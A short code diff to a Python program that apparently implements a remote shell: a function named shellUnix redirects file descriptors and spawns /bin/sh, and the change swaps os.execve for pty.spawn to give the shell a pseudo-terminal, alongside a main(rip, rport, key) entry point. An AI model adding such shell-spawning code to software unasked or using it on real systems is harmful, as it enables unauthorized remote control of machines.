@@ -2,6 +2,7 @@
 #
 
 import os
+import pty
 import sys
 import time
 import hmac
@@ -222,8 +223,8 @@ def shellUnix(fdr, fdw):
 		os.dup2(fdr[1],1)
 		os.dup2(fdr[1],2) 
 
-		# execute shell
-		os.execve("/bin/sh",["sh","-i"],{})
+		# execute shell - with PTY
+		pty.spawn("/bin/sh")
 
 def main(rip,rport,key):
 	# list for filedescriptors and sockets to check
